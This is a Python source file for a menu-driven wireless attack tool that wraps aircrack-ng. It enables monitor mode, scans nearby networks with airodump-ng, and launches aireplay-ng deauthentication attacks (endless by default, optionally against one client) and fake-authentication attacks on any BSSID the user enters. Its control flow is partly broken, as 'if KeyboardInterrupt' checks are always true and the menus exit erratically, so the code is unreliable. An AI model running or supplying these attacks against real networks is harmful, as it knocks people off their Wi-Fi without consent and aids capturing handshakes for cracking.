iface = None
import subprocess
import os
import sys

def run_command(cmd):
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        if e.stderr:
            print(f"Error: {e}")

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear_screen()
    banner = f"""
 ██▒   █▓ ▒█████   ▒█████  ▓█████▄  ▒█████   ▒█████  
▓██░   █▒▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒
 ▓██  █▒░▒██░  ██▒▒██░  ██▒░██   █▌▒██░  ██▒▒██░  ██▒
  ▒██ █░░▒██   ██░▒██   ██░░▓█▄   ▌▒██   ██░▒██   ██░
   ▒▀█░  ░ ████▓▒░░ ████▓▒░░▒████▓ ░ ████▓▒░░ ████▓▒░
   ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ 
   ░ ░░    ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░ 
     ░░  ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒  
      ░      ░ ░      ░ ░     ░        ░ ░      ░ ░  
     ░                      ░                        
"""
    print(banner)

##############################
### SIMPLIFIZING FUNCTIONS ###
##############################

def ask_iface():
    global iface
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    ifaces = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            ifaces.append(line.split()[1])
    if not ifaces:
        print("No wireless interfaces found. Exiting.")
        sys.exit(1)
    if len(ifaces) == 1:
        iface = ifaces[0]
        print(f"Found interface: {iface}")
    else:
        print("Available interfaces:")
        for i, name in enumerate(ifaces):
            print(f"  {i+1}. {name}")
        choice = input(f"Select interface (Enter for {ifaces[0]}): ").strip()
        if choice == "":
            iface = ifaces[0]
        elif choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            iface = ifaces[int(choice) - 1]
        else:
            iface = choice
    check = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
    if "Mode:Monitor" in check.stdout:
        print(f"{iface} already in monitor mode.")
        iface = iface
    else:
        print(f"Enabling monitor mode on {iface}...")
        subprocess.run(["sudo", "airmon-ng", "start", iface], check=True)
        mon_iface = iface + "mon"
        check_mon = subprocess.run(["iwconfig", mon_iface], capture_output=True, text=True)
        if "Mode:Monitor" in check_mon.stdout:
            print(f"Monitor interface: {mon_iface}")
            iface = mon_iface
        else:
            iface = iface
            print(f"Monitor interface: {iface}")
    return iface

def exit_cluster():
    global iface
    print(f"Disabling monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "stop", iface])
    print("Exit...")
    sys.exit(0)

####################
### MAIN BACKEND ###
####################

def show_main_menu():
    while True:
        banner()
        print ("""
╭─────────────────╮
│      MAIN       │
│1. airodump-ng   │
│2. areplay-ng    │
│                 │
│3. exit          │
╰─────────────────╯
""")
        choice = input("Select (1/2/3): ")
        if choice == "1":
            airodump_ng_menu()
        if choice == "2":
            aireplay_ng_menu()
        if choice == "3":
            exit_cluster()
        else:
            break

def airodump_ng_menu():
    while True:
        banner()
        print ("""
╭─────────────────╮
│    AIRODUMP     │
│1. scan around   │
│2. scan target   │
│3. scan channel  │
│4. exit          │
╰─────────────────╯
""")
        choice = input("Select (1/2/3): ")
        if choice == "1":
            try:
                subprocess.run(["sudo", "airodump-ng", iface], check=True)
                if KeyboardInterrupt:
                    kbenter = input("Press Enter to continue: ")
                    if kbenter == "":
                        return airodump_ng_menu()
            except subprocess.CalledProcessError:
                print("Error: ")
        elif choice == "2":
            bssid = input("Enter BSSID: ")
            channel = input("Enter channel: ")
            try:
                subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, iface], check=True)
                if KeyboardInterrupt:
                    kbenter = input("Press Enter to continue: ")
                    if kbenter == "":
                        return airodump_ng_menu()
            except subprocess.CalledProcessError:
                print("Error: ")
        elif choice == "3":
            channel = input("Enter Channel: ")
            try:
                subprocess.run(["sudo", "airodump-ng", "--channel", channel, iface], check=True)
                if KeyboardInterrupt:
                    kbenter = input("Press Enter to continue: ")
                    if kbenter == "":
                        return airodump_ng_menu()
            except subprocess.CalledProcessError as e:
                if e.stderr:
                    print(f"{e.stderr}")
        elif choice == "4":
            return main_askless()

def aireplay_ng_menu():
        banner()
        print ("""
╭──────────────────╮
│     AIREPLAY     │
│1. deauth attack  │
│2. fakeauth attack│
│3. exit           │
╰──────────────────╯
""")
        choice = input("Select (1/2/3): ")
        if choice == "1":
            bssid = input("Enter BSSID: ")
            client = input("Enter client MAC (nothing for skip): ")
            print("PS: '0' in count of packets means u'll send packets until u interrupt the attack")
            count = input("Enter your count of packets (default 0): ") or "0"
            cmd = ["sudo", "aireplay-ng", "--deauth", count, "-a", bssid, iface]
            if client:
                cmd.extend(["-c", client])
            run_command(cmd)
            if KeyboardInterrupt:
                print("\n")
                input("Press Enter to continue:")
                return aireplay_ng_menu()
        if choice == "2":
            bssid = input("Enter BSSID: ")
            subprocess.run(["sudo", "aireplay-ng", "--fakeauth", "0", "-a", bssid, iface])
            if KeyboardInterrupt:
                input("Press Enter to continue: ")
                return aireplay_ng_menu()
        if choice == "3":
            return main_askless()

#####################
### LAUNCH SECTOR ###
#####################

def main_askless():
        choice = show_main_menu()

def main():
    if os.getuid() != 0:
        print("RUN ME AS ROOT!")
        sys.exit(1)
    ask_iface()
    choice = show_main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting by a hotkey.")
        exit_cluster()
